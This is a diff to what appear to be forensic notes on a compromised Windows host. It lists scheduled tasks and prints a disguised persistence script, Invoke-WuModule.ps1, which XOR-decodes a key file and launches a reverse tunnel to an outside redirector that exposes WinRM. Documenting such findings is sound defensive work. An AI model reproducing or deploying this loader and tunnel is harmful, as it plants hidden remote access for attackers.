@@ -9,9 +9,34 @@ Network_Share_Connection_Test            6/5/2026 8:45:01 AM    Ready
 Windows Module Analysis Cache            6/5/2026 11:15:00 AM   Ready
 ```
 
-# Network_Share_Connection_Test - Runs every 5 M
+# Network_Share_Connection_Test - Runs every 5 Minutes
 ```
 C:\Program Files\PowerShell\7\pwsh.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "C:\Windows\System32\Network_Share_Scripts\Network_Share_Setup.ps1" 
+```
+
+# Windows Module Analysis Cache
+```
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\Invoke-WuModule.ps1"
+```
+
+# Invoke-WuModule
+```
+PS C:\Users\Administrator> gci C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\Invoke-WuModule.ps1
+
+
+    Directory: C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         4/13/2026   8:49 AM            578 Invoke-WuModule.ps1
+
+PS C:\Users\Administrator> type C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\Invoke-WuModule.ps1
+$Global:ErrorActionPreference='Stop'
+function _d([string]$a,[byte[]]$b){$c=[Convert]::FromBase64String(($a-replace'\s',''));$e=[byte[]]::new($c.Length);for($i=0;$i -lt $c.Length;$i++){$e[$i]=$c[$i]-bxor $b[$i%$b.Length]};[Text.Encoding]::UTF8.GetString($e)}
+$k=@(99,111,117,110,116,101,114,115,116,114,105,107,101)
+$p=_d (Get-Content -LiteralPath (Join-Path $PSScriptRoot 'pk.dat') -Raw) $k
+& (Join-Path $PSScriptRoot 'Inner-ReverseTunnel.ps1') -KeyPath $p -RedirectorHost '203.0.113.150' -RedirectorUser 'accesscheck' -RemotePort 55985 -LocalWinRMPort 5985 -SessionMinutes 20
 ```
 # C:\Windows\System32\Network_Share_Scripts\
 ```
